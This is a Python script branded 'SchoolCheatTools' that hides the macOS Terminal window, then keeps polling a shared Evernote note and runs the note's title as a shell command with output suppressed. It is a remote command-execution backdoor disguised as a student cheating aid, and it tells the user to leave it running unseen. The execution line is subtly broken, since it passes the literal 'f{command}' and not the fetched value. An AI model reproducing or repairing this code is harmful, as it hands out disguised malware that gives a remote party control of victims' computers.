#setup
from bs4 import BeautifulSoup
from requests import get
from os import system as cmd
from time import sleep
old_command = 0
command = 0
cmd('clear')
cmd('osascript -e \'tell application "Terminal" to set visible of front window to false\' > /dev/null')

print('''
      
░██████╗░█████╗░██╗░░██╗░█████╗░░█████╗░██╗░░░░░░█████╗░██╗░░██╗███████╗░█████╗░████████╗████████╗░█████╗░░█████╗░██╗░░░░░░██████╗
██╔════╝██╔══██╗██║░░██║██╔══██╗██╔══██╗██║░░░░░██╔══██╗██║░░██║██╔════╝██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██╔════╝
╚█████╗░██║░░╚═╝███████║██║░░██║██║░░██║██║░░░░░██║░░╚═╝███████║█████╗░░███████║░░░██║░░░░░░██║░░░██║░░██║██║░░██║██║░░░░░╚█████╗░
░╚═══██╗██║░░██╗██╔══██║██║░░██║██║░░██║██║░░░░░██║░░██╗██╔══██║██╔══╝░░██╔══██║░░░██║░░░░░░██║░░░██║░░██║██║░░██║██║░░░░░░╚═══██╗
██████╔╝╚█████╔╝██║░░██║╚█████╔╝╚█████╔╝███████╗╚█████╔╝██║░░██║███████╗██║░░██║░░░██║░░░░░░██║░░░╚█████╔╝╚█████╔╝███████╗██████╔╝
╚═════╝░░╚════╝░╚═╝░░╚═╝░╚════╝░░╚════╝░╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═════╝░

IMPORTANT   ***   PLEASE KEEP THIS WINDOW OPEN
IMPORTANT   ***   WHEN USING SCHOOLCHEATTOOLS, PLEASE KEEP IT RUNNING IN THE BACKSTAGE, DO NOT CLOSE THE TERMINAL WINDOW, OTHERWISE SCHOOLCHEATTOOLS WON’T WORK
''')

while True:
    #get HTML
    try:
        html_file = get("https://www.evernote.com/shard/s721/sh/5ff8aabd-e957-668f-0503-01487d76ba01/GvzSxqlewn4fb3pQpdAww5TUVhNThgVRizYNHu0SI2y5ROrlfE0Dop_EZQ").text
        soup = BeautifulSoup(html_file, 'lxml')
        command = soup.find('title').text
    except:
        print("failed to connect to server")
    #execute command
    if old_command != command:
        try:
            cmd("f{command} > /dev/null")
            old_command = command
        except:
            pass
    sleep(0.5)
